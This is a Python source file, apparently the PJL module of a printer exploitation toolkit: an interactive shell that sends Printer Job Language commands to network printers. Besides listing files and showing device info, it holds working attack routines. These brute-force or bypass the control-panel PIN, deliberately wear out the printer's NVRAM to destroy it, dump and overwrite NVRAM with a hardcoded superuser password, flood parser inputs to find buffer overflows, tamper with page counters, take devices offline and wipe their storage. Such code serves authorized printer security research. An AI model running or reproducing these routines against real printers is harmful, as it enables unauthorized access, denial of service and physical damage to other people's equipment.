# -*- coding: utf-8 -*-

# python standard library
import re, os, random, posixpath

# local pret classes
from printer import printer
from codebook import codebook
from helper import log, output, conv, file, item, chunks, const as c

class pjl(printer):
  # --------------------------------------------------------------------
  # send PJL command to printer, optionally receive response
  def cmd(self, str_send, wait=True, crop=True, binary=False):
    str_recv = "" # response buffer
    str_stat = "" # status buffer
    token = c.DELIMITER + str(random.randrange(2**16)) # unique delimiter
    status = '@PJL INFO STATUS' + c.EOL if self.status and wait else ''
    footer = '@PJL ECHO ' + token + c.EOL + c.EOL if wait else ''
    # send command to printer device
    try:
      cmd_send = c.UEL + str_send + c.EOL + status + footer + c.UEL
      # write to logfile
      log().write(self.logfile, str_send + os.linesep)
      # sent to printer
      self.send(cmd_send)
      # for commands that expect a response
      if wait:
        # use random token as delimiter PJL responses
        str_recv = self.recv('(@PJL ECHO\s+)?' + token + '.*$', wait, True, binary)
        if self.status:
          # get status messages and remove them from received buffer
          str_stat = item(re.findall("@PJL INFO STATUS.*", str_recv, re.DOTALL))
          str_recv = re.compile('\x0c?@PJL INFO STATUS.*', re.DOTALL).sub('', str_recv)
        if crop:
          # crop very first PJL line which is echoed by most interpreters
          str_recv = re.sub(r'^\x04?(\x00+)?@PJL.*' + c.EOL, '', str_recv)
      return self.pjl_err(str_recv, str_stat)

    # handle CTRL+C and exceptions
    except (KeyboardInterrupt, Exception) as e:
      if not self.fuzz or not str(e): self.reconnect(str(e))
      return ""

  # handle error messages from PJL interpreter
  def pjl_err(self, str_recv, str_stat):
    # show file error messages
    self.fileerror(str_recv)
    # show PJL status messages
    self.showstatus(str_stat)
    # but return buffer anyway
    return str_recv

  # disable unsolicited/conflicting status messages
  def on_connect(self, mode):
    if mode == 'init': # only for the first connection attempt
      self.cmd('@PJL USTATUSOFF', False) # disable status messages

  # ------------------------[ status ]----------------------------------
  def do_status(self, arg):
    "Enable status messages."
    self.status = not self.status
    print("Status messages enabled" if self.status else "Status messages disabled")

  # parse PJL status message
  def showstatus(self, str_stat):
    codes = {}; messages = {}
    # get status codes
    for (num, code) in re.findall('CODE(\d+)?\s*=\s*(\d+)', str_stat):
      codes[num] = code
    # get status messages
    for (num, mstr) in re.findall('DISPLAY(\d+)?\s*=\s*"(.*)"', str_stat):
      messages[num] = mstr
    # show codes and messages
    for num, code in codes.items():
      message = messages[num] if num in messages else "UNKNOWN STATUS"
      # workaround for hp printers with wrong range
      if code.startswith("32"):
        code = str(int(code) - 2000)
      # show status from display and codebook
      error = item(codebook().get_errors(code), 'Unknown status')
      output().errmsg("CODE " + code + ": " + message, error)

  # parse PJL file errors
  def fileerror(self, str_recv):
    self.error = None
    for code in re.findall("FILEERROR\s*=\s*(\d+)", str_recv):
      # file errors are 300xx codes
      code = "3" + code.zfill(4)
      for error in codebook().get_errors(code):
        self.chitchat("PJL Error: " + error)
        self.error = code

  # --------------------------------------------------------------------
  # check if remote volume exists
  def vol_exists(self, vol=''):
    str_recv = self.cmd('@PJL INFO FILESYS')
    vols = [line.lstrip()[0] for line in str_recv.splitlines()[1:] if line]
    if vol: return vol[0] in vols # return availability
    else: # return list of existing volumes for fuzzing
      return [vol + ':' + c.SEP for vol in vols]

  # check if remote directory exists
  def dir_exists(self, path):
    str_recv = self.cmd('@PJL FSQUERY NAME="' + path + '"', True, False)
    if re.search("TYPE=DIR", str_recv):
      return True

  # check if remote file exists
  def file_exists(self, path):
    str_recv = self.cmd('@PJL FSQUERY NAME="' + path + '"', True, False)
    size = re.findall("TYPE\s*=\s*FILE\s+SIZE\s*=\s*(\d*)", str_recv)
    # return file size
    return conv().int(item(size, c.NONEXISTENT))

  #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
  # auto-complete dirlist for remote fs
  options_rfiles = {}
  def complete_rfiles(self, text, line, begidx, endidx, path=''):
    # get path from line
    if c.SEP in line:
      path = posixpath.dirname(re.split("\s+", line, 1)[-1:][0])
    # get dirlist, set new remote path
    newpath = self.cwd + c.SEP + path
    if not self.options_rfiles or newpath != self.oldpath_rfiles:
      self.options_rfiles = self.dirlist(path)
      self.oldpath_rfiles = self.cwd + c.SEP + path
    # options_rfiles contains basenames
    text = self.basename(text)
    return [cat for cat in self.options_rfiles if cat.startswith(text)]

  # define alias
  complete_append = complete_rfiles # files or directories
  complete_delete = complete_rfiles # files or directories
  complete_rm     = complete_rfiles # files or directories
  complete_get    = complete_rfiles # files or directories
  complete_cat    = complete_rfiles # files or directories
  complete_edit   = complete_rfiles # files or directories
  complete_vim    = complete_rfiles # files or directories
  complete_touch  = complete_rfiles # files or directories
  complete_rename = complete_rfiles # files or directories
  complete_mv     = complete_rfiles # files or directories

  #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
  # auto-complete dirlist for remote fs (directories only)
  options_rdirs = {}
  def complete_rdirs(self, text, line, begidx, endidx, path=''):
    # get path from line
    if c.SEP in line:
      path = posixpath.dirname(re.split("\s+", line, 1)[-1:][0])
    # get dirlist, set new remote path
    newpath = self.cwd + c.SEP + path
    if not self.options_rdirs or newpath != self.oldpath_rdirs:
      self.options_rdirs = self.dirlist(path, True, False, True)
      self.oldpath_rdirs = newpath
    # options_rdirs contains basenames
    text = self.basename(text)
    return [cat for cat in self.options_rdirs if cat.startswith(text)]

  # define alias
  complete_ls     = complete_rdirs # directories only
  complete_cd     = complete_rdirs # directories only
  complete_rmdir  = complete_rdirs # directories only
  complete_find   = complete_rdirs # directories only
  complete_mirror = complete_rdirs # directories only

  #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
  # get list of files and directories on remote device
  def dirlist(self, path, sep=True, hidden=False, dirsonly=False, r=True):
    # get remote path if not in recursive mode
    if r: path = self.rpath(path)
    # receive list of files on remote device
    str_recv = self.cmd('@PJL FSDIRLIST NAME="' + path + '" ENTRY=1 COUNT=65535')
    list = {}
    for item in str_recv.splitlines():
      # get directories
      dirname = re.findall("^(.*)\s+TYPE\s*=\s*DIR$", item)
      if dirname and (dirname[0] not in ("", ".", "..") or hidden):
        sep = c.SEP if sep and dirname[0][-1:] != c.SEP else ''
        list[dirname[0] + sep] = None
      # get files
      filename = re.findall("^(.*)\s+TYPE\s*=\s*FILE", item)
      filesize = re.findall("FILE\s+SIZE\s*=\s*(\d*)", item)
      if filename and filesize and not dirsonly:
        list[filename[0]] = filesize[0]
    return list

  # ------------------------[ ls <path> ]-------------------------------
  def do_ls(self, arg):
    "List contents of remote directory:  ls <path>"
    list = self.dirlist(arg, False, True)
    # remove '.' and '..' from non-empty directories
    if set(list).difference(('.', '..')):
      for key in set(list).intersection(('.', '..')): del list[key]
    # list files with syntax highlighting
    for name, size in sorted(list.items()):
      output().pjldir(name, size)

  # ====================================================================

  # ------------------------[ mkdir <path> ]----------------------------
  def do_mkdir(self, arg):
    "Create remote directory:  mkdir <path>"
    if not arg:
      arg = raw_input("Directory: ")
    path = self.rpath(arg)
    self.cmd('@PJL FSMKDIR NAME="' + path + '"', False)

  # ------------------------[ get <file> ]------------------------------
  def get(self, path, size=None):
    if not size:
      size = self.file_exists(path)
    if size != c.NONEXISTENT:
      str_recv = self.cmd('@PJL FSUPLOAD NAME="' + path
      + '" OFFSET=0 SIZE=' + str(size), True, True, True)
      return (size, str_recv)
    else:
      print("File not found.")
      return c.NONEXISTENT

  # ------------------------[ put <local file> ]------------------------
  def put(self, path, data):
      lsize = len(data)
      self.cmd('@PJL FSDOWNLOAD FORMAT:BINARY SIZE=' + str(lsize) +
               ' NAME="' + path + '"' + c.EOL + data, False)

  # ------------------------[ append <file> <string> ]------------------
  def append(self, path, data):
      lsize = len(data)
      self.cmd('@PJL FSAPPEND FORMAT:BINARY SIZE=' + str(lsize) +
               ' NAME="' + path + '"' + c.EOL + data, False)

  # ------------------------[ delete <file> ]---------------------------
  def delete(self, arg):
    path = self.rpath(arg)
    self.cmd('@PJL FSDELETE NAME="' + path + '"', False)

  # ------------------------[ find <path> ]-----------------------------
  def do_find(self, arg):
    "Recursively list contents of directory:  find <path>"
    self.fswalk(arg, 'find')

  # ------------------------[ mirror <local path> ]---------------------
  def do_mirror(self, arg):
    "Mirror remote file system to local directory:  mirror <remote path>"
    print("Creating mirror of " + c.SEP + self.vpath(arg))
    self.fswalk(arg, 'mirror')

  # perform recursive function on file system
  def fswalk(self, arg, mode, recursive=False):
    # add traversal and cwd in first run
    if not recursive: arg = self.vpath(arg)
    # add volume information to pathname
    path = self.vol + self.normpath(arg)
    list = self.dirlist(path, True, False, False, False)
    # for files in current directory
    for name, size in sorted(list.items()):
      name = self.normpath(arg) + self.get_sep(arg) + name
      name = name.lstrip(c.SEP) # crop leading slashes
      # execute function for current file
      if mode == 'find': output().raw(c.SEP + name)
      if mode == 'mirror': self.mirror(name, size)
      # recursion on directory
      if not size: self.fswalk(name, mode, True)

  # ====================================================================

  # ------------------------[ id ]--------------------------------------
  def do_id(self, *arg):
    "Show device information (alias for 'info id')."
    self.do_info('id')

  # ------------------------[ df ]--------------------------------------
  def do_df(self, arg):
    "Show volume information (alias for 'info filesys')."
    self.do_info('filesys')

  # ------------------------[ free ]------------------------------------
  def do_free(self, arg):
    "Show available memory (alias for 'info memory')."
    self.do_info('memory')

  # ------------------------[ env ]-------------------------------------
  def do_env(self, arg):
    "Show environment variables (alias for 'info variables')."
    self.do_info('variables', arg)

  # ------------------------[ version ]---------------------------------
  def do_version(self, *arg):
    "Show firmware version or serial number (from 'info config')."
    if not self.do_info('config', '.*(VERSION|FIRMWARE|SERIAL|NUMBER|MODEL).*'):
      self.do_info('prodinfo', '', False) # some hp printers repsone to this one
      self.do_info('brfirmware', '', False) # brother requires special treatment

  # ------------------------[ info <category> ]-------------------------
  def do_info(self, arg, item='', echo=True):
    if arg in self.options_info or not echo:
      str_recv = self.cmd('@PJL INFO ' + arg.upper()).rstrip()
      if item:
        match = re.findall("(" + item + "=.*(\n\t.*)*)", str_recv, re.I|re.M)
        if echo:
          for m in match: output().info(m[0])
          if not match: print("Not available.")
        return match
      else:
        for line in str_recv.splitlines():
          if arg == 'id': line = line.strip('"')
          if arg == 'filesys': line = line.lstrip()
          output().info(line)
    else:
      self.help_info()

  def help_info(self):
    print("Show information:  info <category>")
    print("  info config      - Provides configuration information.")
    print("  info filesys     - Returns PJL file system information.")
    print("  info id          - Provides the printer model number.")
    print("  info memory      - Identifies amount of memory available.")
    print("  info pagecount   - Returns the number of pages printed.")
    print("  info status      - Provides the current printer status.")
    print("  info ustatus     - Lists the unsolicited status variables.")
    print("  info variables   - Lists printer's environment variables.")

  # undocumented (old hp laserjet): log, tracking, prodinfo, supplies
  options_info = ('config', 'filesys', 'id', 'log', 'memory', 'pagecount',
    'prodinfo', 'status', 'supplies', 'tracking', 'ustatus', 'variables')
  def complete_info(self, text, line, begidx, endidx):
    return [cat for cat in self.options_info if cat.startswith(text)]

  # ------------------------[ printenv <variable> ]---------------------
  def do_printenv(self, arg):
    "Show printer environment variable:  printenv <VAR>"
    str_recv = self.cmd('@PJL INFO VARIABLES')
    variables = []
    for item in str_recv.splitlines():
      var = re.findall("^(.*)=", item)
      if var:
        variables += var
      self.options_printenv = variables
      match = re.findall("^(" + re.escape(arg) + ".*)\s+\[", item, re.I)
      if match: output().info(match[0])

  options_printenv = []
  def complete_printenv(self, text, line, begidx, endidx):
    if not self.options_printenv:
      str_recv = self.cmd('@PJL INFO VARIABLES')
      for item in str_recv.splitlines():
        match = re.findall("^(.*)=", item)
        if match:
          self.options_printenv += match
    return [cat for cat in self.options_printenv if cat.startswith(text)]

  # define alias
  complete_env = complete_printenv
  complete_set = complete_printenv

  # ------------------------[ set ]-------------------------------------
  def do_set(self, arg, fb=True):
    "Set printer environment variable:  set <VAR=VALUE>"
    if not arg:
      arg = raw_input("Set variable (VAR=VALUE): ")
    self.cmd('@PJL SET SERVICEMODE=HPBOISEID' + c.EOL
           + '@PJL DEFAULT ' + arg            + c.EOL
           + '@PJL SET '     + arg            + c.EOL
           + '@PJL SET SERVICEMODE=EXIT', False)
    if fb: self.onecmd('printenv ' + re.split("=", arg, 1)[0])

  # ------------------------[ pagecount <number> ]----------------------
  def do_pagecount(self, arg):
    "Manipulate printer's page counter:  pagecount <number>"
    if not arg:
      output().raw("Hardware page counter: ", '')
      self.onecmd("info pagecount")
    else:
      output().raw("Old page counter: ", '')
      self.onecmd("info pagecount")
      # set page counter for older HP LaserJets
      # self.cmd('@PJL SET SERVICEMODE=HPBOISEID'     + c.EOL
      #        + '@PJL DEFAULT OEM=ON'                + c.EOL
      #        + '@PJL DEFAULT PAGES='          + arg + c.EOL
      #        + '@PJL DEFAULT PRINTPAGECOUNT=' + arg + c.EOL
      #        + '@PJL DEFAULT SCANPAGECOUNT='  + arg + c.EOL
      #        + '@PJL DEFAULT COPYPAGECOUNT='  + arg + c.EOL
      #        + '@PJL SET SERVICEMODE=EXIT', False)
      self.do_set("PAGES=" + arg, False)
      output().raw("New page counter: ", '')
      self.onecmd("info pagecount")

  # ====================================================================

  # ------------------------[ display <message> ]-----------------------
  def do_display(self, arg):
    "Set printer's display message:  display <message>"
    if not arg:
      arg = raw_input("Message: ")
    arg = arg.strip('"') # remove quotes
    self.chitchat("Setting printer's display message to \"" + arg + "\"")
    self.cmd('@PJL RDYMSG DISPLAY="' + arg + '"', False)

  # ------------------------[ offline <message> ]-----------------------
  def do_offline(self, arg):
    "Take printer offline and display message:  offline <message>"
    if not arg:
      arg = raw_input("Offline display message: ")
    arg = arg.strip('"') # remove quotes
    output().warning("Warning: Taking the printer offline will prevent yourself and others")
    output().warning("from printing or re-connecting to the device. Press CTRL+C to abort.")
    if output().countdown("Taking printer offline in...", 10, self):
      self.cmd('@PJL OPMSG DISPLAY="' + arg + '"', False)

  # ------------------------[ restart ]---------------------------------
  def do_restart(self, arg):
    "Restart printer."
    output().raw("Trying to restart the device via PML (Printer Managment Language)")
    self.cmd('@PJL DMCMD ASCIIHEX="040006020501010301040104"', False)
    if not self.conn._file: # in case we're connected over inet socket
      output().chitchat("This command works only for HP printers. For other vendors, try:")
      output().chitchat("snmpset -v1 -c public " + self.target + " 1.3.6.1.2.1.43.5.1.1.3.1 i 4")

  # ------------------------[ reset ]-----------------------------------
  def do_reset(self, arg):
    "Reset to factory defaults."
    if not self.conn._file: # in case we're connected over inet socket
      output().warning("Warning: This may also reset TCP/IP settings to factory defaults.")
      output().warning("You will not be able to reconnect anymore. Press CTRL+C to abort.")
    if output().countdown("Restoring factory defaults in...", 10, self):
      # reset nvram for pml-aware printers (hp)
      self.cmd('@PJL DMCMD ASCIIHEX="040006020501010301040106"', False)
      # this one might work on ancient laserjets
      self.cmd('@PJL SET SERVICEMODE=HPBOISEID' + c.EOL
             + '@PJL CLEARNVRAM'                + c.EOL
             + '@PJL NVRAMINIT'                 + c.EOL
             + '@PJL INITIALIZE'                + c.EOL
             + '@PJL SET SERVICEMODE=EXIT', False)
      # this one might work on brother printers
      self.cmd('@PJL INITIALIZE'                + c.EOL
             + '@PJL RESET'                     + c.EOL
             + '@PJL EXECUTE SHUTDOWN', False)
      if not self.conn._file: # in case we're connected over inet socket
        output().chitchat("This command works only for HP printers. For other vendors, try:")
        output().chitchat("snmpset -v1 -c public " + self.target + " 1.3.6.1.2.1.43.5.1.1.3.1 i 6")

  # ------------------------[ selftest ]--------------------------------
  def do_selftest(self, arg):
    "Perform various printer self-tests."
    # pjl-based testpage commands
    pjltests = ['SELFTEST',                 # pcl self-test 
                'PCLTYPELIST',              # pcl typeface list
                'CONTSELFTEST',             # continuous self-test
                'PCLDEMOPAGE',              # pcl demo page
                'PSCONFIGPAGE',             # ps configuration page
                'PSTYPEFACELIST',           # ps typeface list
                'PSDEMOPAGE',               # ps demo page
                'EVENTLOG',                 # printer event log
                'DATASTORE',                # pjl variables
                'ERRORREPORT',              # error report
                'SUPPLIESSTATUSREPORT']     # supplies status
    for test in pjltests: self.cmd('@PJL SET TESTPAGE=' + test, False)
    # pml-based testpage commands
    pmltests = ['"04000401010502040103"',   # pcl self-test 
                '"04000401010502040107"',   # drinter event log
                '"04000401010502040108"',   # directory listing
                '"04000401010502040109"',   # menu map
                '"04000401010502040164"',   # usage page
                '"04000401010502040165"',   # supplies page
              # '"040004010105020401FC"',   # auto cleaning page
              # '"0440004010105020401FD"',  # cleaning page
                '"040004010105020401FE"',   # paper path test
                '"040004010105020401FF"',   # registration page
                '"040004010105020402015E"', # pcl font list
                '"04000401010502040201C2"'] # ps font list
    for test in pmltests: self.cmd('@PJL DMCMD ASCIIHEX=' + test, False)
    # this one might work on brother printers
    self.cmd('@PJL EXECUTE MAINTENANCEPRINT'  + c.EOL
           + '@PJL EXECUTE TESTPRINT'         + c.EOL
           + '@PJL EXECUTE DEMOPAGE'          + c.EOL
           + '@PJL EXECUTE RESIFONT'          + c.EOL
           + '@PJL EXECUTE PERMFONT'          + c.EOL
           + '@PJL EXECUTE PRTCONFIG', False)

  # ------------------------[ format ]----------------------------------
  def do_format(self, arg):
    "Initialize printer's mass storage file system."
    output().warning("Warning: Initializing the printer's file system will whipe-out all")
    output().warning("user data (e.g. stored jobs) on the volume. Press CTRL+C to abort.")
    if output().countdown("Initializing volume " + self.vol[:2] + " in...", 10, self):
      self.cmd('@PJL FSINIT VOLUME="' + self.vol[0] + '"', False)

  # ------------------------[ disable ]---------------------------------
  def do_disable(self, arg):
    jobmedia = self.cmd('@PJL DINQUIRE JOBMEDIA') or '?'
    if '?' in jobmedia: return output().info("Not available")
    elif 'ON' in jobmedia: self.do_set('JOBMEDIA=OFF', False)
    elif 'OFF' in jobmedia: self.do_set('JOBMEDIA=ON', False)
    jobmedia = self.cmd('@PJL DINQUIRE JOBMEDIA') or '?'
    output().info("Printing is now " + jobmedia)

  # define alias but do not show alias in help
  do_enable = do_disable
  def help_disable(self):
    print("Disable printing functionality.")

  # ------------------------[ destroy ]---------------------------------
  def do_destroy(self, arg):
    "Cause physical damage to printer's NVRAM."
    output().warning("Warning: This command tries to cause physical damage to the")
    output().warning("printer NVRAM. Use at your own risk. Press CTRL+C to abort.")
    if output().countdown("Starting NVRAM write cycle loop in...", 10, self):
      self.chitchat("Dave, stop. Stop, will you? Stop, Dave. Will you stop, Dave?")
      date = conv().now() # timestamp the experiment started
      steps = 100 # number of pjl commands to send at once
      chunk = ['@PJL DEFAULT COPIES=' + str(n%(steps-2)) for n in range(2, steps)]
      for count in range(0, 10000000):
        # test if we can still write to nvram
        if count%10 == 0:
          self.do_set("COPIES=42" + arg, False)
          copies = self.cmd('@PJL DINQUIRE COPIES') or '?'
          if not copies or '?' in copies:
            output().chitchat("I'm sorry Dave, I'm afraid I can't do that.")
            if count > 0: output().chitchat("Device crashed?")
            return
          elif not '42' in copies:
            self.chitchat("\rI'm afraid. I'm afraid, Dave. Dave, my mind is going...")
            dead = conv().elapsed(conv().now() - date)
            print("NVRAM died after " + str(count*steps) + " cycles, " + dead)
            return
        # force writing to nvram using by setting a variable many times
        self.chitchat("\rNVRAM write cycles:  " + str(count*steps), '')
        self.cmd(c.EOL.join(chunk) + c.EOL + '@PJL INFO ID')
    print # echo newline if we get this far

  # ------------------------[ hold ]------------------------------------
  def do_hold(self, arg):
    "Enable job retention."
    self.chitchat("Setting job retention, reconnecting to see if still enabled")
    self.do_set('HOLD=ON', False)
    self.do_reconnect()
    output().raw("Retention for future print jobs: ", '')
    hold = self.do_info('variables', '^HOLD', False)
    output().info(item(re.findall("=(.*)\s+\[", item(item(hold)))) or 'NOT AVAILABLE')
    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    ### Sagemcom printers: @PJL SET RETAIN_JOB_BEFORE_PRINT = ON
    ###                    @PJL SET RETAIN_JOB_AFTER_PRINT  = ON

  # ------------------------[ nvram <operation> ]-----------------------
  # nvram operations (brother-specific)
  def do_nvram(self, arg):
    # dump nvram
    if arg.startswith('dump'):
      bs = 2**9    # memory block size used for sampling
      max = 2**18  # maximum memory address for sampling
      steps = 2**9 # number of bytes to dump at once (feedback-performance trade-off)
      lpath = os.path.join('nvram', self.basename(self.target)) # local copy of nvram
      #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
      # ******* sampling: populate memspace with valid addresses ******
      if len(re.split("\s+", arg, 1)) > 1:
        memspace = []
        commands = ['@PJL RNVRAM ADDRESS=' + str(n) for n in range(0, max, bs)]
        self.chitchat("Sampling memory space (bs=" + str(bs) + ", max=" + str(max) + ")")
        for chunk in (list(chunks(commands, steps))):
          str_recv = self.cmd(c.EOL.join(chunk))
          # break on unsupported printers
          if not str_recv: return
          # collect valid memory addresses
          blocks = re.findall('ADDRESS\s*=\s*(\d+)', str_recv)
          for addr in blocks: memspace += range(conv().int(addr), conv().int(addr) + bs)
          self.chitchat(str(len(blocks)) + " blocks found. ", '')
      else: # use fixed memspace (quick & dirty but might cover interesting stuff)
        memspace = range(0, 8192) + range(32768, 33792) + range(53248, 59648)
      #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
      # ******* dumping: read nvram and write copy to local file ******
      commands = ['@PJL RNVRAM ADDRESS=' + str(n) for n in memspace]
      self.chitchat("Writing copy to " + lpath)
      if os.path.isfile(lpath): file().write(lpath, '') # empty file
      for chunk in (list(chunks(commands, steps))):
        str_recv = self.cmd(c.EOL.join(chunk))
        if not str_recv: return # break on unsupported printers
        else: self.makedirs('nvram') # create nvram directory
        data = ''.join([conv().chr(n) for n in re.findall('DATA\s*=\s*(\d+)', str_recv)])
        file().append(lpath, data) # write copy of nvram to disk
        output().dump(data) # print asciified output to screen
      print
    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    # read nvram (single byte)
    elif arg.startswith('read'):
      arg = re.split("\s+", arg, 1)
      if len(arg) > 1:
        arg, addr = arg
        output().info(self.cmd('@PJL RNVRAM ADDRESS=' + addr))
      else: self.help_nvram()
    #- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
    # write nvram (single byte)
    elif arg.startswith('write'):
      arg = re.split("\s+", arg, 2)
      if len(arg) > 2:
        arg, addr, data = arg
        self.cmd('@PJL SUPERUSER PASSWORD=0' + c.EOL
               + '@PJL WNVRAM ADDRESS=' + addr + ' DATA=' + data + c.EOL
               + '@PJL SUPERUSEROFF', False)
      else: self.help_nvram()
    else:
      self.help_nvram()

  def help_nvram(self):
    print("NVRAM operations:  nvram <operation>")
    print("  nvram dump [all]         - Dump (all) NVRAM to local file.")
    print("  nvram read addr          - Read single byte from address.")
    print("  nvram write addr value   - Write single byte to address.")

  options_nvram = ('dump', 'read', 'write')
  def complete_nvram(self, text, line, begidx, endidx):
    return [cat for cat in self.options_nvram if cat.startswith(text)]

  # ====================================================================

  # ------------------------[ lock <pin> ]------------------------------
  def do_lock(self, arg):
    "Lock control panel settings and disk write access."
    if not arg:
      arg = raw_input("Enter PIN (1..65535): ")
    self.cmd('@PJL DEFAULT PASSWORD=' + arg + c.EOL
           + '@PJL DEFAULT CPLOCK=ON'       + c.EOL
           + '@PJL DEFAULT DISKLOCK=ON', False)
    self.show_lock()

  def show_lock(self):
    passwd   = self.cmd('@PJL DINQUIRE PASSWORD') or "UNSUPPORTED"
    cplock   = self.cmd('@PJL DINQUIRE CPLOCK')   or "UNSUPPORTED"
    disklock = self.cmd('@PJL DINQUIRE DISKLOCK') or "UNSUPPORTED"
    if '?' in passwd:   passwd   = "UNSUPPORTED"
    if '?' in cplock:   cplock   = "UNSUPPORTED"
    if '?' in disklock: disklock = "UNSUPPORTED"
    output().info("PIN protection:  " + passwd)
    output().info("Panel lock:      " + cplock)
    output().info("Disk lock:       " + disklock)

  # ------------------------[ unlock <pin> ]----------------------------
  def do_unlock(self, arg):
    "Unlock control panel settings and disk write access."
    # first check if locking is supported by device
    str_recv = self.cmd('@PJL DINQUIRE PASSWORD')
    if not str_recv or '?' in str_recv:
      return output().errmsg("Cannot unlock", "locking not supported by device")
    # user-supplied pin vs. 'exhaustive' key search
    if not arg:
      print("No PIN given, cracking.")
      keyspace = [""] + range(1, 65536) # protection can be bypassed with
    else:                               # empty password one some devices
      try:
        keyspace = [int(arg)]
      except Exception as e:
        output().errmsg("Invalid PIN", e)
        return
    # for optimal performance set steps to 500-1000 and increase timeout
    steps = 500 # set to 1 to get actual PIN (instead of just unlocking)
    # unlock, bypass or crack PIN
    for chunk in (list(chunks(keyspace, steps))):
      str_send = ""
      for pin in chunk:
        # try to remove PIN protection
        str_send += '@PJL JOB PASSWORD=' + str(pin) + c.EOL \
                 +  '@PJL DEFAULT PASSWORD=0' + c.EOL
      # check if PIN protection still active
      str_send += '@PJL DINQUIRE PASSWORD'
      # visual feedback on cracking process
      if len(keyspace) > 1 and pin:
        self.chitchat("\rTrying PIN " + str(pin) + " (" + "%.2f" % (pin/655.35) + "%)", '')
      # send current chunk of PJL commands
      str_recv = self.timeoutcmd(str_send, self.timeout*5)
      # seen hardcoded strings like 'ENABLED', 'ENABLE' and 'ENALBED' (sic!) in the wild
      if str_recv.startswith("ENA"):
        if len(keyspace) == 1:
          output().errmsg("Cannot unlock", "Bad PIN")
      else:
        # disable control panel lock and disk lock
        self.cmd('@PJL DEFAULT CPLOCK=OFF' + c.EOL
               + '@PJL DEFAULT DISKLOCK=OFF', False)
        if len(keyspace) > 1 and pin:
          self.chitchat("\r")
        # exit cracking loop
        break
    self.show_lock()

  # ====================================================================

  # ------------------------[ flood <size> ]----------------------------
  def do_flood(self, arg):
    "Flood user input, may reveal buffer overflows: flood <size>"
    size = conv().int(arg) or 10000 # buffer size
    char = '0' # character to fill the user input
    # get a list of printer-specific variables to set
    self.chitchat("Receiving PJL variables.", '')
    lines = self.cmd('@PJL INFO VARIABLES').splitlines()
    variables = [var.split('=', 1)[0] for var in lines if '=' in var]
    self.chitchat(" Found " + str(len(variables)) + " variables.")
    # user input to flood = custom pjl variables and command parameters
    inputs = ['@PJL SET ' + var + '=[buffer]' for var in variables] + [
      ### environment commands ###
      '@PJL SET [buffer]',
      ### generic parsing ###
      '@PJL [buffer]',
      ### kernel commands ###
      '@PJL COMMENT [buffer]',
      '@PJL ENTER LANGUAGE=[buffer]',
      ### job separation commands ###
      '@PJL JOB NAME="[buffer]"',
      '@PJL EOJ NAME="[buffer]"',
      ### status readback commands ###
      '@PJL INFO [buffer]',
      '@PJL ECHO [buffer]',
      '@PJL INQUIRE [buffer]',
      '@PJL DINQUIRE [buffer]',
      '@PJL USTATUS [buffer]',
      ### device attendance commands ###
      '@PJL RDYMSG DISPLAY="[buffer]"',
      ### file system commands ###
      '@PJL FSQUERY NAME="[buffer]"',
      '@PJL FSDIRLIST NAME="[buffer]"',
      '@PJL FSINIT VOLUME="[buffer]"',
      '@PJL FSMKDIR NAME="[buffer]"',
      '@PJL FSUPLOAD NAME="[buffer]"']
    for val in inputs:
      output().raw("Buffer size: " + str(size) + ", Sending: ", val + os.linesep)
      self.timeoutcmd(val.replace('[buffer]', char*size), self.timeout*10, False)
    self.cmd("@PJL ECHO") # check if device is still reachable
